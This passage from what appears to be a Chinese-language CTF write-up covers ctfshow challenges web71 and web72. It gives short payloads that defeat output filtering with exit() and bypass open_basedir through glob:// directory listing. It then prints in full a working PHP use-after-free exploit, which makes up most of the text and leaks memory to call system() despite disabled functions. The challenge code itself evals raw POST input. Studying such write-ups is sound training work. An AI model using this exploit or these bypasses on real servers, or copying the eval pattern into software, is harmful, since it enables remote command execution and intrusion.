</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">你要上天吗？
</span></span></span></code></pre></div><ul>
<li>
<p><code>$s = ob_get_contents();</code>：获取输出缓冲区的内容并赋值给变量<code>s</code>。输出缓冲区在 PHP 中用于临时存储要输出到浏览器等的内容，以便在合适的时候进行处理或修改。</p>
</li>
<li>
<p><code>ob_end_clean();</code>：清空输出缓冲区并关闭它，这样就清除了原始的、未经处理的输出内容，以便后续进行自定义的输出处理。</p>
</li>
<li>
<p><code>echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</code>：这行代码使用正则表达式对获取到的输出内容（存储在<code>s</code>中）进行替换操作。它会将所有的数字和字母（不区分大小写）都替换为<code>?</code>，然后将处理后的内容输出到浏览器等输出端。</p>
</li>
</ul>
<p>也就是说这道题会对回显进行处理，让我们没法得到回显</p>
<p>我们可以用exit()/die()提前结束程序，从而不执行后续代码直接进行回显</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));exit();
</code></pre><p><img alt="image-20241129144431247" loading="lazy" src="../assets/image-20241129144431247.png"></p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flag.txt&#39;);exit();
</code></pre><p><img alt="image-20241129144855221" loading="lazy" src="../assets/image-20241129144855221.png"></p>
<h4 id="web72">web72<a hidden class="anchor" aria-hidden="true" href="#web72">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">你要上天吗？
</span></span></span></code></pre></div><p>这道题一开始还以为和上一题差不多</p>
<p><img alt="image-20241129150755401" loading="lazy" src="../assets/image-20241129150755401.png"></p>
<p>先进行目录查询</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;./&#34;));exit();
</code></pre><p>注意⚠️ 这道题只有权限查询的当前目录也就是<code>./</code></p>
<p>而无法访问到其他目录的文件，如 / 根目录</p>
<blockquote>
<p>尝试使用 scandir() 函数来扫描根目录，但由于 open_basedir 限制，这个操作被禁止了。
open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。
当前配置只允许访问 /var/www/html/ 目录及其子目录，但不允许访问其他目录。</p>
<p>原文链接：https://blog.csdn.net/Myon5/article/details/140079942</p></blockquote>
<p>我们可以尝试用glob协议绕过open_basedir协议</p>
<p>payload:（记得删注释）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// 创建一个DirectoryIterator对象，遍历根目录
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">foreach($a as $f)// 遍历每个条目
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">{
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">   echo($f-&gt;__toString().&#39; &#39;);// 输出条目的名称，并添加一个空格
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">exit(0); // 终止脚本执行
</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p><img alt="image-20241129151607469" loading="lazy" src="../assets/image-20241129151607469.png"></p>
<p>或者</p>
<p>payload：（记得删注释）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php $a = opendir(&#34;glob:///*&#34;); // 打开根目录，并将目录句柄赋值给$a
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">while (($file = readdir($a)) !== false) { // 循环读取目录中的每个条目
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">    echo $file . &#34;&lt;br&gt;&#34;; // 输出每个条目的名称，并添加HTML换行标签
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">};
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">exit(0); // 终止脚本执行
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>我们可以发现flag0.php</p>
<p>利用uaf的脚本进行命令利用uaf的脚本进行命令执行执行：</p>
<p>尝试执行ls /; cat /flag0.txt命令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php
</span></span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="err">pwn(&#34;ls /;cat /flag0.txt&#34;);
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="err">function pwn($cmd) {
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="err">    global $abc, $helper, $backtrace;
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="err">    class Vuln {
</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="err">        public $a;
</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="err">        public function __destruct() { 
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="err">            global $backtrace; 
</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="err">            unset($this-&gt;a);
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="err">            $backtrace = (new Exception)-&gt;getTrace(); # ;)
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="err">            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="err">                $backtrace = debug_backtrace();
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="err">    class Helper {
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="err">        public $a, $b, $c, $d;
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="err">    function str2ptr(&amp;$str, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="err">        $address = 0;
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="err">        for($j = $s-1; $j &gt;= 0; $j--) {
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="err">            $address &lt;&lt;= 8;
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="err">            $address |= ord($str[$p+$j]);
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="err">        return $address;
</span></span></span><span class="line"><span class="ln"> 29</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="err">    function ptr2str($ptr, $m = 8) {
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="err">        $out = &#34;&#34;;
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="err">        for ($i=0; $i &lt; $m; $i++) {
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="err">            $out .= sprintf(&#39;%c&#39;,$ptr &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="err">            $ptr &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="err">        return $out;
</span></span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 39</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="err">    function write(&amp;$str, $p, $v, $n = 8) {
</span></span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="err">        $i = 0;
</span></span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $n; $i++) {
</span></span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="err">            $str[$p + $i] = sprintf(&#39;%c&#39;,$v &amp; 0xff);
</span></span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="err">            $v &gt;&gt;= 8;
</span></span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="err">    function leak($addr, $p = 0, $s = 8) {
</span></span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="err">        global $abc, $helper;
</span></span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="err">        write($abc, 0x68, $addr + $p - 0x10);
</span></span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="err">        $leak = strlen($helper-&gt;a);
</span></span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="err">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
</span></span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="err">        return $leak;
</span></span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="err">    function parse_elf($base) {
</span></span></span><span class="line"><span class="ln"> 57</span><span class="cl"><span class="err">        $e_type = leak($base, 0x10, 2);
</span></span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="err">        $e_phoff = leak($base, 0x20);
</span></span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="err">        $e_phentsize = leak($base, 0x36, 2);
</span></span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="err">        $e_phnum = leak($base, 0x38, 2);
</span></span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $e_phnum; $i++) {
</span></span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="err">            $header = $base + $e_phoff + $i * $e_phentsize;
</span></span></span><span class="line"><span class="ln"> 65</span><span class="cl"><span class="err">            $p_type  = leak($header, 0, 4);
</span></span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="err">            $p_flags = leak($header, 4, 4);
</span></span></span><span class="line"><span class="ln"> 67</span><span class="cl"><span class="err">            $p_vaddr = leak($header, 0x10);
</span></span></span><span class="line"><span class="ln"> 68</span><span class="cl"><span class="err">            $p_memsz = leak($header, 0x28);
</span></span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 70</span><span class="cl"><span class="err">            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
</span></span></span><span class="line"><span class="ln"> 71</span><span class="cl"><span class="err">                # handle pie
</span></span></span><span class="line"><span class="ln"> 72</span><span class="cl"><span class="err">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
</span></span></span><span class="line"><span class="ln"> 73</span><span class="cl"><span class="err">                $data_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 74</span><span class="cl"><span class="err">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
</span></span></span><span class="line"><span class="ln"> 75</span><span class="cl"><span class="err">                $text_size = $p_memsz;
</span></span></span><span class="line"><span class="ln"> 76</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln"> 77</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln"> 78</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="err">        if(!$data_addr || !$text_size || !$data_size)
</span></span></span><span class="line"><span class="ln"> 80</span><span class="cl"><span class="err">            return false;
</span></span></span><span class="line"><span class="ln"> 81</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 82</span><span class="cl"><span class="err">        return [$data_addr, $text_size, $data_size];
</span></span></span><span class="line"><span class="ln"> 83</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 84</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 85</span><span class="cl"><span class="err">    function get_basic_funcs($base, $elf) {
</span></span></span><span class="line"><span class="ln"> 86</span><span class="cl"><span class="err">        list($data_addr, $text_size, $data_size) = $elf;
</span></span></span><span class="line"><span class="ln"> 87</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $data_size / 8; $i++) {
</span></span></span><span class="line"><span class="ln"> 88</span><span class="cl"><span class="err">            $leak = leak($data_addr, $i * 8);
</span></span></span><span class="line"><span class="ln"> 89</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 90</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 91</span><span class="cl"><span class="err">                # &#39;constant&#39; constant check
</span></span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="err">                if($deref != 0x746e6174736e6f63)
</span></span></span><span class="line"><span class="ln"> 93</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln"> 94</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln"> 95</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 96</span><span class="cl"><span class="err">            $leak = leak($data_addr, ($i + 4) * 8);
</span></span></span><span class="line"><span class="ln"> 97</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 98</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 99</span><span class="cl"><span class="err">                # &#39;bin2hex&#39; constant check
</span></span></span><span class="line"><span class="ln">100</span><span class="cl"><span class="err">                if($deref != 0x786568326e6962)
</span></span></span><span class="line"><span class="ln">101</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln">102</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln">103</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">104</span><span class="cl"><span class="err">            return $data_addr + $i * 8;
</span></span></span><span class="line"><span class="ln">105</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">106</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">108</span><span class="cl"><span class="err">    function get_binary_base($binary_leak) {
</span></span></span><span class="line"><span class="ln">109</span><span class="cl"><span class="err">        $base = 0;
</span></span></span><span class="line"><span class="ln">110</span><span class="cl"><span class="err">        $start = $binary_leak &amp; 0xfffffffffffff000;
</span></span></span><span class="line"><span class="ln">111</span><span class="cl"><span class="err">        for($i = 0; $i &lt; 0x1000; $i++) {
</span></span></span><span class="line"><span class="ln">112</span><span class="cl"><span class="err">            $addr = $start - 0x1000 * $i;
</span></span></span><span class="line"><span class="ln">113</span><span class="cl"><span class="err">            $leak = leak($addr, 0, 7);
</span></span></span><span class="line"><span class="ln">114</span><span class="cl"><span class="err">            if($leak == 0x10102464c457f) { # ELF header
</span></span></span><span class="line"><span class="ln">115</span><span class="cl"><span class="err">                return $addr;
</span></span></span><span class="line"><span class="ln">116</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">117</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">118</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">119</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">120</span><span class="cl"><span class="err">    function get_system($basic_funcs) {
</span></span></span><span class="line"><span class="ln">121</span><span class="cl"><span class="err">        $addr = $basic_funcs;
</span></span></span><span class="line"><span class="ln">122</span><span class="cl"><span class="err">        do {
</span></span></span><span class="line"><span class="ln">123</span><span class="cl"><span class="err">            $f_entry = leak($addr);
</span></span></span><span class="line"><span class="ln">124</span><span class="cl"><span class="err">            $f_name = leak($f_entry, 0, 6);
</span></span></span><span class="line"><span class="ln">125</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">126</span><span class="cl"><span class="err">            if($f_name == 0x6d6574737973) { # system
</span></span></span><span class="line"><span class="ln">127</span><span class="cl"><span class="err">                return leak($addr + 8);
</span></span></span><span class="line"><span class="ln">128</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">129</span><span class="cl"><span class="err">            $addr += 0x20;
</span></span></span><span class="line"><span class="ln">130</span><span class="cl"><span class="err">        } while($f_entry != 0);
</span></span></span><span class="line"><span class="ln">131</span><span class="cl"><span class="err">        return false;
</span></span></span><span class="line"><span class="ln">132</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">133</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">134</span><span class="cl"><span class="err">    function trigger_uaf($arg) {
</span></span></span><span class="line"><span class="ln">135</span><span class="cl"><span class="err">        # str_shuffle prevents opcache string interning
</span></span></span><span class="line"><span class="ln">136</span><span class="cl"><span class="err">        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">137</span><span class="cl"><span class="err">        $vuln = new Vuln();
</span></span></span><span class="line"><span class="ln">138</span><span class="cl"><span class="err">        $vuln-&gt;a = $arg;
</span></span></span><span class="line"><span class="ln">139</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">140</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">141</span><span class="cl"><span class="err">    if(stristr(PHP_OS, &#39;WIN&#39;)) {
</span></span></span><span class="line"><span class="ln">142</span><span class="cl"><span class="err">        die(&#39;This PoC is for *nix systems only.&#39;);
</span></span></span><span class="line"><span class="ln">143</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">144</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">145</span><span class="cl"><span class="err">    $n_alloc = 10; # increase this value if UAF fails
</span></span></span><span class="line"><span class="ln">146</span><span class="cl"><span class="err">    $contiguous = [];
</span></span></span><span class="line"><span class="ln">147</span><span class="cl"><span class="err">    for($i = 0; $i &lt; $n_alloc; $i++)
</span></span></span><span class="line"><span class="ln">148</span><span class="cl"><span class="err">        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">149</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">150</span><span class="cl"><span class="err">    trigger_uaf(&#39;x&#39;);
</span></span></span><span class="line"><span class="ln">151</span><span class="cl"><span class="err">    $abc = $backtrace[1][&#39;args&#39;][0];
</span></span></span><span class="line"><span class="ln">152</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">153</span><span class="cl"><span class="err">    $helper = new Helper;
</span></span></span><span class="line"><span class="ln">154</span><span class="cl"><span class="err">    $helper-&gt;b = function ($x) { };
</span></span></span><span class="line"><span class="ln">155</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">156</span><span class="cl"><span class="err">    if(strlen($abc) == 79 || strlen($abc) == 0) {
</span></span></span><span class="line"><span class="ln">157</span><span class="cl"><span class="err">        die(&#34;UAF failed&#34;);
</span></span></span><span class="line"><span class="ln">158</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">159</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">160</span><span class="cl"><span class="err">    # leaks
</span></span></span><span class="line"><span class="ln">161</span><span class="cl"><span class="err">    $closure_handlers = str2ptr($abc, 0);
</span></span></span><span class="line"><span class="ln">162</span><span class="cl"><span class="err">    $php_heap = str2ptr($abc, 0x58);
</span></span></span><span class="line"><span class="ln">163</span><span class="cl"><span class="err">    $abc_addr = $php_heap - 0xc8;
</span></span></span><span class="line"><span class="ln">164</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">165</span><span class="cl"><span class="err">    # fake value
</span></span></span><span class="line"><span class="ln">166</span><span class="cl"><span class="err">    write($abc, 0x60, 2);
</span></span></span><span class="line"><span class="ln">167</span><span class="cl"><span class="err">    write($abc, 0x70, 6);
</span></span></span><span class="line"><span class="ln">168</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="err">    # fake reference
</span></span></span><span class="line"><span class="ln">170</span><span class="cl"><span class="err">    write($abc, 0x10, $abc_addr + 0x60);
</span></span></span><span class="line"><span class="ln">171</span><span class="cl"><span class="err">    write($abc, 0x18, 0xa);
</span></span></span><span class="line"><span class="ln">172</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">173</span><span class="cl"><span class="err">    $closure_obj = str2ptr($abc, 0x20);
</span></span></span><span class="line"><span class="ln">174</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">175</span><span class="cl"><span class="err">    $binary_leak = leak($closure_handlers, 8);
</span></span></span><span class="line"><span class="ln">176</span><span class="cl"><span class="err">    if(!($base = get_binary_base($binary_leak))) {
</span></span></span><span class="line"><span class="ln">177</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t determine binary base address&#34;);
</span></span></span><span class="line"><span class="ln">178</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">179</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">180</span><span class="cl"><span class="err">    if(!($elf = parse_elf($base))) {
</span></span></span><span class="line"><span class="ln">181</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t parse ELF header&#34;);
</span></span></span><span class="line"><span class="ln">182</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">183</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">184</span><span class="cl"><span class="err">    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
</span></span></span><span class="line"><span class="ln">185</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get basic_functions address&#34;);
</span></span></span><span class="line"><span class="ln">186</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">187</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">188</span><span class="cl"><span class="err">    if(!($zif_system = get_system($basic_funcs))) {
</span></span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get zif_system address&#34;);
</span></span></span><span class="line"><span class="ln">190</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">191</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">192</span><span class="cl"><span class="err">    # fake closure object
</span></span></span><span class="line"><span class="ln">193</span><span class="cl"><span class="err">    $fake_obj_offset = 0xd0;
</span></span></span><span class="line"><span class="ln">194</span><span class="cl"><span class="err">    for($i = 0; $i &lt; 0x110; $i += 8) {
</span></span></span><span class="line"><span class="ln">195</span><span class="cl"><span class="err">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
</span></span></span><span class="line"><span class="ln">196</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">197</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">198</span><span class="cl"><span class="err">    # pwn
</span></span></span><span class="line"><span class="ln">199</span><span class="cl"><span class="err">    write($abc, 0x20, $abc_addr + $fake_obj_offset);
</span></span></span><span class="line"><span class="ln">200</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
</span></span></span><span class="line"><span class="ln">201</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
</span></span></span><span class="line"><span class="ln">202</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">203</span><span class="cl"><span class="err">    ($helper-&gt;b)($cmd);
</span></span></span><span class="line"><span class="ln">204</span><span class="cl"><span class="err">    exit();
</span></span></span><span class="line"><span class="ln">205</span><span class="cl"><span class="err">}
